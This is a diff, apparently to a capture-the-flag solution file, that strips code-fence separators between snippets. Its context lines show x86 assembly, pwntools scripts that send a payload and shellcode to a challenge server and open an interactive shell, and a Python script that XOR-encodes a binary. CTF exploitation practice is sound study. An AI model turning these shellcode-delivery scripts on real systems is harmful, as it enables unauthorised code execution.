@@ -14,11 +14,6 @@ int 0x80
 add al, [eax]
 add eax,[eax]
 add [eax],eax
-```
-
-
-
-```
 ; nasm -f elf32 tmp.asm && ld -m elf_i386 -o tmp tmp.o
 section .text
 global _start
@@ -37,11 +32,6 @@ vlun:
 _start:
  call vlun
  xor al, 0
-```
-
-
-
-```
 from pwn import *
 
 # p = remote("0.cloud.chals.io", 20922)
@@ -61,11 +51,6 @@ payload = asm(
 
 p.send(payload)
 p.interactive()
-```
-
-
-
-```
 from pwn import *
 
 # p = remote("0.cloud.chals.io", 20922)
@@ -117,11 +102,6 @@ shellcode = asm(
 p.send(payload)
 p.send(shellcode)
 p.interactive()
-```
-
-
-
-```
 section .text
 global _start
 
@@ -147,11 +127,6 @@ point:
 
 _start:
  call first
-```
-
-
-
-```
 with open("binary_shrink", "rb") as f:
  data = bytearray(f.read()) + bytearray([0 for i in range(0x100)])
 
@@ -163,6 +138,6 @@ with open("generated_binary", "wb") as f:
  data[rdx] = data[rdx] ^ data[i]
  data[rdx] = data[rdx] ^ 0x42
  rdx += 1
- 
+
  f.write(data)
 ```
